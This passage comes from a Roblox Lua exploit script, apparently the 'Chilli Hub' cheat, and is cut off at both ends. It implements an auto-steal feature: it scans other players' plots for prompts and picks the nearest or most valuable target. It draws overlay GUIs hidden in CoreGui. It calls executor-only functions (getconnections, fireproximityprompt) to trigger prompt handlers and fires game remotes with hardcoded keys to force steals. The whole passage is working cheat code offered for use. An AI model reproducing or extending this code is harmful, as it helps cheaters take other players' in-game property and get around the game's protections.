						if attribute then
							local str3 = tostring(attribute)

							if not matchMap[str3] then
								matchMap[str3] = true
								table.insert(matchs, str3)
							end
						end
					end

					local text2 = text and v and v[text]
					local n10 = 1

					if text2 then
						n10 = 1 + (tonumber(v[text].Modifier) or 0)
					end

					local flag8 = false

					if v2 then
						for _, match in ipairs(matchs) do
							local v4 = v2[match] or v2[match:gsub("_", " ")]

							if v4 then
								if match == "Sleepy" or v4.Name == "Sleepy" then
									flag8 = true
								else
									n10 += tonumber(v4.MultiplierModifier) or 0
								end
							end
						end
					end

					local n11 = math.round(numVal * n10 * (flag8 and 0.5 or 1))
					local v4 = fn20(overhead and overhead:FindFirstChild("Generation") and overhead.Generation.Text)
					if v4 and v4 > n11 then
						return v4
					end
					return n11 > 0 and n11 or v4 or numVal
				end

				fn6 = function(arg)
					local now = os.clock()
					if not arg and now - n7 < n8 then
						return
					end
					n7 = now
					local list = {}
					local plots = Workspace:FindFirstChild("Plots")

					if plots then
						local debris = Workspace:FindFirstChild("Debris")
						local textMap = {}

						if debris then
							for _, child in ipairs(debris:GetChildren()) do
								if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
									local animalOverhead = child:FindFirstChild("AnimalOverhead")
									local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

									if displayName and displayName:IsA("TextLabel") and displayName.Text ~= "" then
										local text = displayName.Text
										textMap[text] = textMap[text] or {}
										table.insert(textMap[text], { Position = child.Position, Overhead = animalOverhead })
									end
								end
							end
						end

						for _, child in ipairs(plots:GetChildren()) do
							local animalPodiums = child:FindFirstChild("AnimalPodiums")

							if animalPodiums then
								for _, child2 in ipairs(animalPodiums:GetChildren()) do
									local base = child2:FindFirstChild("Base")
									base = base and base:FindFirstChild("Spawn")

									if base and base:IsA("BasePart") then
										local promptAttachment = base:FindFirstChild("PromptAttachment")
										local v3 = ipairs
										promptAttachment = promptAttachment or base
										local descendant = nil

										for _, descendant2 in v3(promptAttachment:GetDescendants()) do
											if descendant2:IsA("ProximityPrompt") and tostring(descendant2.ActionText) == str then
												descendant = descendant2
												break
											else
												descendant = nil
											end
										end

										if descendant then
											local str3 = tostring(descendant.ObjectText or "")

											list[#list + 1] = {
												Prompt = descendant,
												Plot = child,
												Spawn = base,
												Name = str3,
												Generation = fn21(base, child, str3, textMap),
											}
										end
									end
								end
							end
						end
					end

					tbl3 = list
				end
			end

			local n10
			n10 = 0.03
			local n11
			n11 = -math.huge
			local position
			position = nil
			local v3
			v3 = nil
			local v4
			v4 = nil
			local v5
			v5 = nil
			local v6
			v6 = nil
			local v7
			v7 = nil
			local fn20

			fn20 = function(arg, arg2, distance, generation)
				local tbl6 = { Prompt = arg.Prompt, Plot = arg.Plot, Position = arg2 }
				local name = arg.Name
				local name2

				if name then
					name2 = name
				else
					name2 = tostring(arg.Prompt.ObjectText or "")
				end

				tbl6.Name = name2
				tbl6.Generation = generation
				tbl6.Distance = distance
				return tbl6
			end

			prompt2 = nil

			fn7 = function(arg)
				if not arg then
					return nil
				end

				for _, v8 in ipairs(tbl3) do
					if v8.Prompt == arg then
						return v8
					end
				end

				return nil
			end

			fn8 = function(arg)
				if prompt2 and prompt2.Parent and arg then
					local v8 = fn7(prompt2)

					if v8 then
						local position2 = v8.Spawn.Position
						local fn202 = fn20
						local magnitude = (arg.Position - position2).Magnitude
						return fn202(v8, position2, magnitude, v8.Generation or 0)
					end
				end

				return nil
			end

			fn9 = function(arg, arg2, arg3, arg4)
				if flag4 then
					arg2 = arg4 or arg2
					if arg2 and arg2.Distance <= n3 then
						return arg2
					end
					return nil
				end

				local v8 = fn8(arg)
				if v8 then
					return v8
				end
				return arg3
			end

			str2 = "Default (Chilli Hub)"
			fn10 = nil
			fn11 = nil
			chilliMacLibTargetGui = Instance.new("ScreenGui")
			chilliMacLibTargetGui.Name = "ChilliMacLibTargetGui"
			chilliMacLibTargetGui.ResetOnSpawn = false
			chilliMacLibTargetGui.IgnoreGuiInset = true
			chilliMacLibTargetGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			chilliMacLibTargetGui.Enabled = false

			pcall(function()
				chilliMacLibTargetGui.Parent = type(gethui) == "function" and gethui() or CoreGui
			end)

			do
				local targetCard = Instance.new("Frame")
				targetCard.Name = "TargetCard"
				targetCard.AnchorPoint = Vector2.new(0.5, 0)
				targetCard.Position = UDim2.new(0.5, 0, 0, 72)
				targetCard.Size = UDim2.fromOffset(270, 48)
				targetCard.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
				targetCard.BackgroundTransparency = 0.15
				targetCard.BorderSizePixel = 0
				targetCard.Parent = chilliMacLibTargetGui
				Instance.new("UICorner", targetCard).CornerRadius = UDim.new(0, 10)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(58, 255, 55)
				uiStroke.Thickness = 1.2
				uiStroke.Transparency = 0.3
				uiStroke.Parent = targetCard
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Position = UDim2.fromOffset(12, 5)
				textLabel3.Size = UDim2.new(1, -24, 0, 14)
				textLabel3.Font = Enum.Font.GothamBold
				textLabel3.TextSize = 11
				textLabel3.TextColor3 = Color3.fromRGB(58, 255, 55)
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				textLabel3.Text = "AUTO STEAL (MAC LIB) - MỤC TIÊU GẦN NHẤT"
				textLabel3.Parent = targetCard
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(12, 22)
				textLabel4.Size = UDim2.new(1, -24, 0, 20)
				textLabel4.Font = Enum.Font.GothamBlack
				textLabel4.TextSize = 13
				textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.Text = "Đang quét tìm brainrot gần nhất..."
				textLabel4.Parent = targetCard
				local flag8 = false
				local v8 = nil
				local vector2 = Vector2.new(0, 0)
				local v9 = nil

				fn2(targetCard.InputBegan:Connect(function()
				end))

				fn2(UserInputService2.InputChanged:Connect(function(input)
					if input == v8 or not v8 then
						local n12 = Vector2.new(input.Position.X, input.Position.Y) - vector2
						targetCard.Position = UDim2.new(v9.X.Scale, v9.X.Offset + n12.X, v9.Y.Scale, v9.Y.Offset + n12.Y)
					end
				end))

				fn2(UserInputService2.InputEnded:Connect(function(input)
					local flag9 = input == v8

					if flag9 or not v8 then
						flag8 = false
						v8 = nil
						v9 = nil
					end
				end))

				fn12 = function(arg)
					if chilliMacLibTargetGui.Parent then
						if not (str2 and string.find(str2, "Mac")) then
							chilliMacLibTargetGui.Enabled = false
							return
						end
						chilliMacLibTargetGui.Enabled = true

						if arg and arg.Name then
							local distance = arg.Distance and string.format("%.1fm", arg.Distance) or ""
							local generation = arg.Generation and arg.Generation > 0 and " | " .. fn5(arg.Generation) or ""
							textLabel4.Text = string.format("%s (%s)%s", tostring(arg.Name), distance, generation)
						else
							textLabel4.Text = "Đang quét tìm brainrot gần nhất..."
						end
					end
				end
			end

			fn13 = function(arg)
				fn12(arg)
			end

			do
				local function formatCompact(arg)
					local match, match2 = tostring(arg or ""):match("%$?([%d%.]+)%s*([KMB]?)")
					if not match then
						return 0
					end
					local n12 = tonumber(match) or 0

					if match2 == "K" then
						n12 *= 1000
					elseif match2 == "M" then
						n12 *= 1000000
					elseif match2 == "B" then
						n12 *= 1e9
					end

					return n12
				end

				local function fn21()
					local name = localPlayer.Name
					local displayName = localPlayer.DisplayName
					local plots = Workspace:FindFirstChild("Plots")

					if plots then
						for _, child in ipairs(plots:GetChildren()) do
							local plotSign = child:FindFirstChild("PlotSign")

							if plotSign then
								local surfaceGui = plotSign:FindFirstChild("SurfaceGui")

								if surfaceGui then
									local frame2 = surfaceGui:FindFirstChild("Frame")

									if frame2 then
										local textLabel3 = frame2:FindFirstChildOfClass("TextLabel")

										if textLabel3 and type(textLabel3.Text) == "string" then
											local text = textLabel3.Text
											if string.find(text, displayName, 1, true) or string.find(text, name, 1, true) then
												return child
											end
											continue
										end

										continue
									end
								end
							end
						end
					end

					return nil
				end

				local function fn22(arg)
					if not (arg and arg:IsA("Model")) then
						return nil
					end

					for _, descendant in ipairs(arg:GetDescendants()) do
						if descendant:IsA("TextLabel") then
							local str3 = string.lower(descendant.Name)
							if str3 == "generation" or str3 == "gen" or str3:find("generation") or str3:find("gen") then
								return descendant
							end
						end
					end

					return nil
				end

				fn14 = function(arg)
					if not arg then
						return nil, nil, 0
					end
					local position2 = arg.Position
					local v8 = nil
					local v9 = nil
					local n12 = -math.huge
					local huge = math.huge
					local n13 = 0

					local function fn23(arg2, arg3, arg4, arg5)
						if arg2 and arg2.Parent and tostring(arg2.ActionText) == str and not fn4(arg2) then
							if not arg4 then
								arg4 = tostring(arg2.ObjectText or "")
							end

							if type(arg5) ~= "number" then
								local flag8 = type(arg5) == "string" and arg5 ~= ""
								local n14 = 0

								if flag8 then
									arg5 = formatCompact(arg5)
								else
									arg5 = n14
								end
							end

							if arg5 == 0 then
								arg5 = toNumberOrDefault(arg4)
							end

							if not (arg5 > 0 and arg5 < n2) then
								n13 += 1
								local magnitude = (position2 - arg3).Magnitude

								if magnitude <= n3 then
									local tbl6 = {
										Prompt = arg2,
										Spawn = { Position = arg3 },
										Position = arg3,
										Name = arg4,
										Generation = arg5,
										Distance = magnitude,
									}

									if not v8 or arg5 > n12 then
										v8 = tbl6
										n12 = arg5
									end

									if not v9 or magnitude < huge then
										v9 = tbl6
										huge = magnitude
									end
								end
							end
						end
					end

					local plots = Workspace:FindFirstChild("Plots")
					local flag8 = os.clock() < n9

					if plots and not flag8 then
						local v10 = fn21()

						for _, child in ipairs(plots:GetChildren()) do
							if child ~= v10 then
								local animalPodiums = child:FindFirstChild("AnimalPodiums")

								if animalPodiums then
									for _, child2 in ipairs(animalPodiums:GetChildren()) do
										local base = child2:FindFirstChild("Base")
										local spawn = base and base:FindFirstChild("Spawn")

										if spawn and spawn:IsA("BasePart") then
											local promptAttachment = spawn:FindFirstChild("PromptAttachment") or spawn
											local descendant = nil

											for _, descendant2 in ipairs(promptAttachment:GetDescendants()) do
												if descendant2:IsA("ProximityPrompt") and tostring(descendant2.ActionText) == str then
													descendant = descendant2
													break
												else
													descendant = nil
												end
											end

											if descendant then
												local str3 = tostring(descendant.ObjectText or "")
												local attachment = spawn:FindFirstChild("Attachment")
												attachment = attachment and attachment:FindFirstChild("AnimalOverhead")
												local str4 = ""

												if attachment then
													local generation = attachment:FindFirstChild("Generation")

													if generation and generation:IsA("TextLabel") then
														str4 = generation.Text
													end
												end

												if str4 == "" and str3 ~= "" then
													local v11 = child:FindFirstChild(str3) or child:FindFirstChild(str3, true)

													if v11 and v11:IsA("Model") then
														local v12 = fn22(v11)

														if v12 then
															str4 = v12.Text
														end
													end
												end

												fn23(descendant, spawn.Position, str3, str4, child.Name, tostring(i))
											end
										end
									end
								end
							end
						end
					end

					local debris = Workspace:FindFirstChild("Debris")

					if debris then
						for _, child in ipairs(debris:GetChildren()) do
							local str3 = string.lower(child.Name or "")

							if str3 ~= "lucky block" and str3 ~= "camera" and not child:IsA("Camera") then
								local descendant = nil

								for _, descendant2 in ipairs(child:GetDescendants()) do
									if descendant2:IsA("ProximityPrompt") and tostring(descendant2.ActionText) == str then
										descendant = descendant2
										break
									else
										descendant = nil
									end
								end

								if descendant then
									local position3 = child:IsA("BasePart") and child.Position or child:IsA("Model") and child.PrimaryPart and child.PrimaryPart.Position or descendant.Parent and descendant.Parent:IsA("BasePart") and descendant.Parent.Position

									if position3 then
										local str4 = ""

										if child:IsA("Model") then
											local v10 = fn22(child)

											if v10 then
												str4 = v10.Text
											end
										end

										fn23(descendant, position3, tostring(descendant.ObjectText or child.Name), str4, nil, nil)
									end
								end
							end
						end
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player.Character then
							local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart then
								for _, descendant in ipairs(player.Character:GetDescendants()) do
									if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
										fn23(descendant, humanoidRootPart.Position, tostring(descendant.ObjectText or "Carried Brainrot"), "", nil, nil)
									end
								end
							end
						end
					end

					return v8, v9, n13
				end
			end

			fn15 = function(arg)
				if not arg then
					return nil, nil, nil, nil, 0
				end
				local now = os.clock()
				local position2 = arg.Position
				if now - n11 < n10 and position and (position2 - position).Magnitude < 0.5 then
					return v3, v4, v5, v6, v7
				end
				fn6(false)
				local n12 = 0
				local v8 = nil
				local generation = nil
				local v9 = nil
				local magnitude = nil
				local v10 = nil
				local generation2 = nil
				local v11 = nil
				local magnitude2 = nil

				for _, v12 in ipairs(tbl3) do
					local prompt3 = v12.Prompt

					if prompt3.Parent and prompt3.Enabled and tostring(prompt3.ActionText) == str and not fn4(prompt3) then
						local generation3 = v12.Generation or 0
						local flag42 = flag4
						local flag422

						if flag4 then
							flag422 = flag42
						else
							flag422 = generation3 >= n2
						end

						if flag422 then
							n12 += 1
							local position3 = v12.Spawn.Position
							local magnitude3 = (position2 - position3).Magnitude

							if not v8 or generation3 > generation then
								v8 = fn20(v12, position3, magnitude3, generation3)
								generation = generation3
							end

							if not v9 or magnitude3 < magnitude then
								v9 = fn20(v12, position3, magnitude3, generation3)
								magnitude = magnitude3
							end

							if magnitude3 <= n3 then
								if not v10 or generation3 > generation2 then
									v10 = fn20(v12, position3, magnitude3, generation3)
									generation2 = generation3
								end

								if not v11 or magnitude3 < magnitude2 then
									v11 = fn20(v12, position3, magnitude3, generation3)
									magnitude2 = magnitude3
								end
							end
						end
					end
				end

				n11 = now
				position = position2
				v3 = v10
				v4 = v11
				v5 = v8
				v6 = v9
				v7 = n12
				return v10, v11, v8, v9, n12
			end

			fn16 = function(arg)
				if not (not arg or not arg:IsA("ProximityPrompt") or not arg.Parent or type(getconnections) ~= "function") then
					local list = {}
					local list2 = {}

					if not (not pcall(function()
						for _, v8 in pairs(getconnections(arg.PromptButtonHoldBegan)) do
							if v8 and v8.Function then
								list[#list + 1] = v8.Function
							end
						end

						for _, v8 in pairs(getconnections(arg.Triggered)) do
							if v8 and v8.Function then
								list2[#list2 + 1] = v8.Function
							end
						end
					end) or #list2 == 0) then
						return list, list2
					end
				end

				return nil
			end

			do
				local CoreGui2 = CoreGui

				pcall(function()
					if type(gethui) == "function" then
						local hui = gethui()

						if typeof(hui) == "Instance" then
							CoreGui2 = hui
						end
					end
				end)

				local chilliAutoGetBarGui2 = CoreGui2:FindFirstChild("ChilliAutoGetBarGui")

				if chilliAutoGetBarGui2 then
					pcall(function()
						chilliAutoGetBarGui2:Destroy()
					end)
				end

				chilliAutoGetBarGui = Instance.new("ScreenGui")
				chilliAutoGetBarGui.Name = "ChilliAutoGetBarGui"
				chilliAutoGetBarGui.ResetOnSpawn = false
				chilliAutoGetBarGui.IgnoreGuiInset = true
				chilliAutoGetBarGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				chilliAutoGetBarGui.Enabled = false
				chilliAutoGetBarGui.Parent = CoreGui2
			end

			local color
			color = Color3.fromRGB(58, 255, 55)
			local color2
			color2 = Color3.fromRGB(20, 109, 0)
			local createUIGradient

			do
				local gothamBold = Enum.Font.GothamBold

				pcall(function()
					gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
				end)

				local function fn21(arg)
					if typeof(gothamBold) == "Font" then
						arg.FontFace = gothamBold
					else
						arg.Font = Enum.Font.GothamBold
					end
				end

				createUIGradient = function(parent, arg, arg2)
					local uiGradient = Instance.new("UIGradient")
					local colorSequenceKeypointNew = ColorSequenceKeypoint.new
					uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, arg), colorSequenceKeypointNew(1, arg2) })
					uiGradient.Rotation = 90
					uiGradient.Parent = parent
					return uiGradient
				end

				holder = Instance.new("Frame")
				holder.Name = "Holder"
				holder.AnchorPoint = Vector2.new(0.5, 0)
				holder.Position = UDim2.new(0.5, 0, 0, 10)
				holder.Size = UDim2.fromOffset(248, 46)
				holder.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
				holder.BackgroundTransparency = 0.28
				holder.BorderSizePixel = 0
				holder.Parent = chilliAutoGetBarGui
				Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 16)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.93
				uiStroke.Parent = holder
				local n12 = 0.125
				local n13 = 248
				local n14 = 1
				local uiScale = Instance.new("UIScale")
				uiScale.Parent = holder

				local function clampValue()
					local currentCamera = Workspace.CurrentCamera
					local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

					if viewportSize.X < 1 then
						viewportSize = Vector2.new(1280, 720)
					end

					uiScale.Scale = math.clamp(viewportSize.X * n12 * n14 / n13, 0.6, 1.4)
				end

				clampValue()
				local currentCamera = Workspace.CurrentCamera

				if currentCamera then
					fn2(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(clampValue))
				end

				fn2(Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(clampValue))
				textLabel = Instance.new("TextLabel")
				textLabel.BackgroundTransparency = 1
				textLabel.Position = UDim2.fromOffset(14, 8)
				textLabel.Size = UDim2.new(1, -104, 0, 15)
				textLabel.TextSize = 13
				textLabel.TextScaled = true
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.TextTruncate = Enum.TextTruncate.None
				textLabel.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel.Text = ""
				fn21(textLabel)
				textLabel.Parent = holder
				local uiTextSizeConstraint = Instance.new("UITextSizeConstraint")
				uiTextSizeConstraint.MinTextSize = 8
				uiTextSizeConstraint.MaxTextSize = 13
				uiTextSizeConstraint.Parent = textLabel
				chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel)
				textLabel2 = Instance.new("TextLabel")
				textLabel2.BackgroundTransparency = 1
				textLabel2.AnchorPoint = Vector2.new(1, 0)
				textLabel2.Position = UDim2.new(1, -14, 0, 8)
				textLabel2.Size = UDim2.fromOffset(88, 15)
				textLabel2.TextSize = 13
				textLabel2.TextXAlignment = Enum.TextXAlignment.Right
				textLabel2.TextColor3 = color
				textLabel2.Text = ""
				fn21(textLabel2)
			end

			textLabel2.Parent = holder
			local frame2 = Instance.new("Frame")
			frame2.Position = UDim2.fromOffset(14, 30)
			frame2.Size = UDim2.new(1, -28, 0, 6)
			frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame2.BackgroundTransparency = 0.88
			frame2.BorderSizePixel = 0
			frame2.Parent = holder
			Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)
			frame = Instance.new("Frame")
			frame.Size = UDim2.new(0, 0, 1, 0)
			frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame.BorderSizePixel = 0
			frame.Parent = frame2
			Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
			createUIGradient(frame, color, color2)
		end

		local frame2, visible, flag8, n8, n9, n10, n11, fn17, runUntilTimeout2, part
		local destroyAll, fn18, fn19

		do
			local frame3 = Instance.new("Frame")
			frame3.Position = UDim2.fromOffset(14, 41)
			frame3.Size = UDim2.new(1, -28, 0, 4)
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame3.BackgroundTransparency = 0.9
			frame3.BorderSizePixel = 0
			frame3.Visible = false
			frame3.Parent = holder
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
			frame2 = Instance.new("Frame")
			frame2.Size = UDim2.new(0, 0, 1, 0)
			frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame2.BackgroundTransparency = 0.55
			frame2.BorderSizePixel = 0
			frame2.Parent = frame3
			Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)
			visible = false
			flag8 = false
			n8 = 0
			n9 = 1
			n10 = 0
			n11 = 0

			fn17 = function()
				flag8 = false
			end

			runUntilTimeout2 = function(arg)
				if not flag5 or not chilliAutoGetBarGui.Parent then
					flag8 = false
					return
				end
				n9 = math.max(tonumber(arg) or 1, 0.01)
				n8 = os.clock()
				flag8 = true
			end

			local n12 = 0.22
			local color = Color3.fromRGB(255, 255, 255)
			part = nil
			local cylinderHandleAdornment = nil
			local radius = 0

			destroyAll = function()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if cylinderHandleAdornment then
					pcall(function()
						cylinderHandleAdornment:Destroy()
					end)

					cylinderHandleAdornment = nil
				end

				if part then
					pcall(function()
						part:Destroy()
					end)

					part = nil
				end

				radius = 0
			end

			local function fn20()
				if part and part.Parent and cylinderHandleAdornment then
					return
				end
				destroyAll()
				local part2 = Instance.new("Part")
				part2.Name = generateRandomId()
				part2.Anchored = true
				part2.CanCollide = false
				part2.CanQuery = false
				part2.CanTouch = false
				part2.CastShadow = false
				part2.Massless = true
				part2.Size = Vector3.one
				part2.Transparency = 1
				part2.Parent = Workspace
				local cylinderHandleAdornment2 = Instance.new("CylinderHandleAdornment")
				cylinderHandleAdornment2.Name = generateRandomId()
				cylinderHandleAdornment2.Adornee = part2
				cylinderHandleAdornment2.AlwaysOnTop = true
				cylinderHandleAdornment2.Color3 = color
				cylinderHandleAdornment2.Height = 0.05
				cylinderHandleAdornment2.InnerRadius = 0
				cylinderHandleAdornment2.Radius = 0
				cylinderHandleAdornment2.Transparency = 0.25
				cylinderHandleAdornment2.ZIndex = 1
				cylinderHandleAdornment2.Parent = part2
				part = part2
				cylinderHandleAdornment = cylinderHandleAdornment2
			end

			fn18 = function(arg)
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

				if not visible or not character_ then
					if part then
						destroyAll()
					end

					return
				end

				fn20()
				local n13 = math.max(tonumber(n3), 1)
				math.min(arg or 0.016, 0.1)
				radius = n13
				part.CFrame = CFrame.new(character_.Position - Vector3.new(0, 2.9, 0)) * CFrame.Angles(-1.5707963267948966, 0, 0)
				cylinderHandleAdornment.Radius = radius
				cylinderHandleAdornment.InnerRadius = math.max(radius - n12, 0)
			end

			fn19 = function(arg)
				visible = arg == true
				frame3.Visible = visible
				holder.Size = UDim2.fromOffset(248, visible and 55 or 46)

				if not visible then
					n11 = 0
					frame2.Size = UDim2.new(0, 0, 1, 0)
					destroyAll()
				end
			end
		end

		local fn20

		fn20 = function(arg, arg2, arg3)
			if textLabel.Parent then
				textLabel.Text = tostring(arg or "")
				chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle, arg3)
			end

			if textLabel2.Parent then
				textLabel2.Text = tostring(arg2 or "")
			end
		end

		do
			local flag9 = false
			local input = nil
			local vector2 = Vector2.new(0, 0)
			local position = nil

			fn2(holder.InputBegan:Connect(function(input2)
				if not (flag9 or input2.UserInputState ~= Enum.UserInputState.Begin) then
					local flag10 = input2.UserInputType == Enum.UserInputType.Touch

					if not (not (input2.UserInputType == Enum.UserInputType.MouseButton1) and not flag10) then
						local vector22 = Vector2.new(input2.Position.X, input2.Position.Y)
						local absolutePosition = holder.AbsolutePosition
						local absoluteSize = holder.AbsoluteSize

						if not (vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y) then
							flag9 = true
							input = flag10 and input2 or nil
							vector2 = vector22
							position = holder.Position
							return
						end
					end
				end
			end))

			fn2(UserInputService2.InputChanged:Connect(function(input2)
				if flag9 and not (not (input and input2 == input or not input and input2.UserInputType == Enum.UserInputType.MouseMovement) or not position) then
					local n12 = Vector2.new(input2.Position.X, input2.Position.Y) - vector2
					holder.Position = UDim2.new(position.X.Scale, position.X.Offset + n12.X, position.Y.Scale, position.Y.Offset + n12.Y)
					return
				end
			end))

			fn2(UserInputService2.InputEnded:Connect(function(input2)
				if flag9 then
					local input3 = input and input2 == input
					local input4

					if input3 then
						input4 = input3
					else
						input4 = not input and input2.UserInputType == Enum.UserInputType.MouseButton1
					end

					if input4 then
						flag9 = false
						input = nil
						position = nil
					end
				end
			end))
		end

		local fn21

		fn21 = function()
			if chilliAutoGetBarGui.Parent then
				chilliAutoGetBarGui.Enabled = flag3 and flag5
			end

			if not flag3 or not flag5 then
				fn17()
				fn20("", "")
			end
		end

		do
			local n12 = 1
			local n13 = 0.25
			local n14 = -math.huge
			local n15 = -math.huge

			local function fn22()
				if flag3 then
					local now = os.clock()

					if not (now - n14 < n12) then
						n14 = now

						task.spawn(function()
							fn11()
							task.wait(0.05)
							fn10()
						end)

						return
					end
				end
			end

			local function runUntilTimeout3(arg)
				local now = os.clock()

				if not (now - n15 < n13) then
					n15 = now

					for _, v in ipairs(arg) do
						pcall(v)
					end
				end
			end

			local function fn23(arg)
				if not (arg and arg.Parent) or type(getconnections) ~= "function" then
					return
				end

				pcall(function()
					for _, v in pairs(getconnections(arg.PromptButtonHoldEnded)) do
						if v and v.Function then
							pcall(v.Function)
						end
					end
				end)
			end

			local function fn24(arg, arg2, arg3, arg4, arg5)
				local prompt3 = type(arg) == "table" and arg.Prompt or arg
				local plotName = type(arg) == "table" and arg.PlotName or nil
				local slotName = type(arg) == "table" and arg.SlotName or nil
				if not prompt3 then
					return false, "no prompt"
				end

				if str2 == "Fix 1 (Wait Before Fire)" then
					task.wait(0.1)
				end

				local n16 = os.clock() - n6
				local n17 = 0

				if str2 == "Fix 2 (Longer Settle)" then
					n17 = 1.5
				end

				if n16 < n17 then
					task.wait(n17 - n16)
				end

				if not flag2 or not flag3 or arg2 ~= n5 then
					return false, "stopped"
				end
				local v, v2 = fn16(prompt3)
				if not v or not v2 then
					return false, "no handlers"
				end
				local n18 = 1.3

				if flag6 then
					flag6 = false
					n18 = 2
				end

				if arg4 then
					pcall(arg4, n18)
				end

				if str2 == "Xen Hub Source v11" then
					if plotName and slotName then
						local function fireRemote()
							pcall(function()
								local reB096e1ca9c3a453b8b60268b235083 = game:GetService("ReplicatedStorage").Packages.Net["RE/b096e1ca-9c3a-453b-8b60-268b235083b9"]
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "5c0bd012-dfb2-4bac-8f1a-e41f136e4744")
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "6be28b5b-dbc3-4aab-aa0c-6ebcfa191f22")
							end)
						end

						local function fireRemote2(arg6, arg7)
							pcall(function()
								game:GetService("ReplicatedStorage").Packages.Net["RE/5aa39ea1-0c65-4fcf-aff9-b18a7ef277c3"]:FireServer(Workspace:GetServerTimeNow() + 67, "c262398d-68e3-4499-8bea-99766bf11686", arg6, tonumber(arg7) or arg7)
								local v3
								v3:FireServer(Workspace:GetServerTimeNow() + 67, "579e6c26-5a80-407d-9488-0f84752e8f1f", arg6, tonumber(arg7) or arg7)
							end)
						end

						fireRemote()
						task.wait(1.3)
						fireRemote2(plotName, slotName)
						return true, "fired xen hub source"
					end

					for _, v3 in ipairs(v) do
						pcall(v3)
					end

					task.wait(1.3)

					for _, v3 in ipairs(v2) do
						pcall(v3)
					end

					return true, "fired fallback"
				end

				if str2 and string.find(str2, "v20") and localPlayer:GetAttribute("Stealing") == true then
					return false, "v20_radar"
				end

				if str2 and string.find(str2, "v21") then
					local now = os.clock()

					while not prompt3.Enabled and prompt3.Parent and os.clock() - now < 0.6 do
						task.wait(0.02)
					end
				end

				if os.clock() - n6 < 1.5 and str2 and (string.find(str2, "Smart Window") or string.find(str2, "v19") or string.find(str2, "v19")) then
					for _, v3 in ipairs(v) do
						pcall(v3)
					end

					task.wait(n18)

					for _, v3 in ipairs(v2) do
						pcall(v3)
					end

					n6 = os.clock()
					return true, "fired (v14 protected window)"
				end

				local pos = str2 and string.find(str2, "v23")

				if pos then
					local v3 = globalCacheLockUntil
					pos = os.clock() < v3
				end

				if (isDebris or pos) and str2 and string.find(str2, "v22") then
					for _, v3 in ipairs(v) do
						pcall(v3)
					end

					task.wait(n18)

					for _, v3 in ipairs(v2) do
						pcall(v3)
					end

					fn23(prompt3)
					n6 = os.clock()
					return true, "fired (v22 debris cache hold)"
				end

				if str2 == "Fix 4 (FireProximityPrompt)" and fireproximityprompt then
					fireproximityprompt(prompt3, 0)
					fireproximityprompt(prompt3, 1)
				end

				for _, v3 in ipairs(v) do
					pcall(v3)
				end

				local str3 = tostring(prompt3.ObjectText)
				local now = os.clock()

				while os.clock() - now < n18 do
					task.wait(0.05)
					if not flag2 or not flag3 or arg2 ~= n5 then
						fn23(prompt3)
						return false, "stopped"
					end

					if not arg5 and localPlayer:GetAttribute("Stealing") == true then
						for _, v3 in ipairs(v2) do
							pcall(v3)
						end

						fn23(prompt3)
						return false, "carrying"
					end

					if tostring(prompt3.ObjectText) ~= str3 then
						runUntilTimeout3(v2)
						fn22()
						fn23(prompt3)
						return false, "brainrot changed"
					end

					if not prompt3.Parent or not prompt3.Enabled or not arg3() then
						runUntilTimeout3(v2)
						fn22()
						fn23(prompt3)
						return false, "retargeted"
					end
				end

				local v22

				if str2 == "Default (Chilli Hub)" or str2 == "Fix 3 (Re-fetch Triggers)" then
					local v3
					v3, v22 = fn16(prompt3)
					v22 = v22 or v2
				else
					v22 = v2
				end

				for _, v3 in ipairs(v22) do
					pcall(v3)
				end

				fn23(prompt3)
				n6 = os.clock()
				return true, "fired"
			end

			local function fn25(arg, arg2, arg3)
